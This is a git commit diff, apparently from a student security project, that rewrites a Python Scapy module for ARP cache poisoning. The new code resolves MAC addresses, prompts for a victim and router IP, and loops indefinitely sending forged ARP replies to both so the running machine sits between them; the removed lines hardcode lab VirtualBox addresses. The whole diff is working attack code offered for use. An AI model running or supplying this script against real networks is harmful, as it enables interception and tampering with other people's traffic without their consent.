571f17354002ed1bf4c2f5599643a8ab839a6f02
Rawbun34 <y.r.chung@student.tue.nl>
2025-05-17 21:31:27 +0200

    implement arp_poisoning with manual user input

--- modules/arp_poison.py
+++ modules/arp_poison.py
@@ -1,18 +1,35 @@
-from scapy.all import Ether, ARP, sendp
+from scapy.all import Ether, ARP, sendp, srp
+import sys
+    
+def get_mac_address(ip):
+    """
+    Get the MAC address of a given IP address using ARP request."""
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
 
-macAttacker = "08:00:27:d0:25:4b" # MAC address of the attacker's machine
-ipAttacker = "192.168.56.103" # IP address of the attacker's machine
+    answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answ[0][1].hwsrc
 
-macVictim = "08:00:27:b7:c4:af" # MAC address of the victim's machine
-ipVictim = "192.168.56.101" # IP address of the victim's machine
+# ipToSpoof = "192.168.56.102" # IP address of the target machine (the one we want to spoof)
+def arp_poison(ipToSpoof, ipVictim):
+    """
+    Perform ARP poisoning
+    """
+    ARP_packet = ARP(op =2, psrc = ipToSpoof,
+                     pdst = ipVictim, hwdst = get_mac_address(ipVictim))
+    sendp(ARP_packet, iface="en0", verbose=False)
 
-ipToSpoof = "192.168.56.102" # IP address of the target machine (the one we want to spoof)
+# TODO: figure out how to perform scanning on a NAT network
+# Right now we request user input
+victim_ip = input("Enter the IP address of the victim: ")
+router_ip = input("Enter the IP address of the router: ")
+packet_count = 0
 
-arp= Ether() / ARP()
-arp[Ether].src = macAttacker
-arp[ARP].hwsrc = macAttacker
-arp[ARP].psrc = ipToSpoof
-arp[ARP].hwdst = macVictim
-arp[ARP].pdst = ipVictim
-
-sendp(arp, iface="enp0s3")
+while True:
+    arp_poison(router_ip, victim_ip)
+    arp_poison(victim_ip, router_ip)
+    packet_count += 2
+    print(f"[+] Number of packet sent: {packet_count}")
+    sys.stdout.write("\r[+] Spoofing " + victim_ip + " and " + router_ip)
+    sys.stdout.flush()
